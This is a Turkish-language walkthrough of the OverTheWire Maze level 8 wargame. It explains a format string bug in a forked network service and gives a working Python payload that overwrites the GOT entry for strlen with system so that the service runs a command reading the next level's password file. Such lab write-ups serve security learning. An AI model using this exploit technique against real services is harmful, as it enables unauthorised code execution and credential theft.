# OverTheWire — Maze Level 8 → 9 (FINAL)

> Hedef: `maze8`'den `maze9` şifresi. Sonuç: **`**********`** (gizlendi)
> Teknik: **Format string açığı** (`snprintf(out, n, kullanıcı_girdisi)`) → `%n` ile arbitrary write → `GOT[strlen]`'i `system`'e ezme (No RELRO) → `system(outbuf)` parolayı sızdırır.

---

## 1. İlk Bakış
```bash
/maze/maze8           # bind(): ... (bir AĞ SERVİSİ; default port 1337)
checksec: No canary | NX DISABLED | No PIE | No RELRO
```
TCP servisi: `socket/bind/listen/accept`, her bağlantı için **`fork`**.

## 2. Analiz (çocuk süreç)
```c
setreuid(geteuid(), geteuid());          // ruid=euid=maze9 (sonraki adımlar maze9'dur)
send(conn, "Give the correct password to proceed: ", ...);
n = recv(conn, recvbuf, 0x1ff, 0);  recvbuf[n] = 0;
if (strcmp(recvbuf, "god") == 0) { ...şaka... }
else {
    snprintf(outbuf, 0x200, recvbuf);    // <-- FORMAT STRING = kullanıcı girdisi!
    // outbuf += " is wrong g ^_^"
    strlen(outbuf);  ...  send(conn, outbuf, ...);  _exit(0);
}
```

## 3. Zafiyet
`snprintf(outbuf, 0x200, recvbuf)` — ikinci argüman sabit bir format değil, **kullanıcının gönderdiği veri**. Klasik **format string** açığı: `%p` ile bellek sızdır, **`%n` ile arbitrary write**. `No RELRO` → GOT yazılabilir.

`%p` probe ile **format offset = 1** bulundu (girdimizin ilk dword'ü `%1$`). `system = 0xf7dd18e0` (gdb, ASLR kapalı), `GOT[strlen] = 0x804b268`.

## 4. Plan — `GOT[strlen]` → `system`
`snprintf`'ten **hemen sonra** `strlen(outbuf)` çağrılıyor. Eğer `GOT[strlen]`'i `system` yaparsak, bu çağrı **`system(outbuf)`** olur. `outbuf`'u **"cat /etc/maze_pass/maze9;#…"** ile başlatırsak komut çalışır, gerisi `#` ile yorum olur.

İki `%hn` yazımı (snprintf `%n`'i **kesilmemiş** sayacı kullanır):
```
düşük yarı 0x18e0 -> 0x804b268
yüksek yarı 0xf7dd -> 0x804b26a
```

## 5. Exploit (payload)
```python
prefix = b"cat /etc/maze_pass/maze9;#".ljust(28,b'#')   # 28 = dword hizalı
a1=p32(0x804b268); a2=p32(0x804b26a)                    # GOT[strlen], +2
printed=28+8
fmt = b"%%%dc%%8$hn%%%dc%%9$hn" % (0x18e0-printed, 0xf7dd-0x18e0)
payload = prefix + a1 + a2 + fmt
# adres dword'leri %8$ (=offset 28) ve %9$ (=offset 32)
```
- `prefix(28)+a1+a2 = 36` karakter basılır → `%<0x18e0-36>c%8$hn` → `0x18e0` @ GOT[strlen].
- `%<0xf7dd-0x18e0>c%9$hn` → `0xf7dd` @ GOT[strlen]+2 → `GOT[strlen]=0xf7dd18e0=system`.
- Sonraki `strlen(outbuf)` → `system("cat /etc/maze_pass/maze9;#…")` → çocuk maze9 olduğu için parola `fd1`'e basılır.

```
=== maze9 password === 
**********
=== /maze9 CONGRATULATIONS ===
Well done! It sure looks like you enjoy swimming in memory.
```

## Dersler
| Konu | Not |
|------|-----|
| Format string | `printf(user)`/`snprintf(buf,n,user)` — kullanıcı girdisi format olarak verilirse `%n`/`%p` açığı |
| `%n` arbitrary write | Basılan karakter sayısını verilen adrese yazar; `%hn`/`%hhn` ile parça parça adres kurulur |
| `snprintf` + `%n` | Kesme (0x200) olsa da `%n` sayacı **tam (would-be) uzunluğu** sayar |
| GOT overwrite | No RELRO → `GOT[strlen]=system`; sonraki `strlen(x)` → `system(x)` |
| `system(outbuf)` | outbuf başına komut + `#` ile gerisini yorumlat |
| Fork+setuid servis | Açık, çocukta `setreuid` sonrası tetiklenir → hedef kullanıcı olarak kod |
